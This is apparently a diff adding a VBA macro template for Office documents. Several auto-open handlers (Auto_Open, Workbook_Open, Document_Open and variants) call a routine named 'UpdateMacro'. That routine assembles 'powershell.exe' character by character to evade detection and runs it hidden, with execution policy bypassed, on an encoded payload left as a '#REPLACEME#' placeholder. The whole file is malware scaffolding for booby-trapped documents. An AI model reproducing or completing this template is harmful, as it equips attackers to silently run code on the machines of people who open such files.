@@ -1,0 +1,47 @@
+Sub Auto_Open()
+UpdateMacro
+End Sub
+
+Sub AutoOpen()
+UpdateMacro
+End Sub
+
+Sub Workbook_Open()
+UpdateMacro
+End Sub
+
+Sub WorkbookOpen()
+UpdateMacro
+End Sub
+
+Sub Document_Open()
+UpdateMacro
+End Sub
+
+Sub DocumentOpen()
+UpdateMacro
+End Sub
+
+Sub UpdateMacro()
+Dim str, exec
+
+#REPLACEME#
+
+exec = "p"
+exec = exec + "o"
+exec = exec + "w"
+exec = exec + "e"
+exec = exec + "r"
+exec = exec + "s"
+exec = exec + "h"
+exec = exec + "e"
+exec = exec + "l"
+exec = exec + "l"
+exec = exec + "."
+exec = exec + "e"
+exec = exec + "x"
+exec = exec + "e"
+exec = exec + " -exec bypass -Noninteractive -windowstyle hidden -e " & str
+
+Shell(exec)
+End Sub
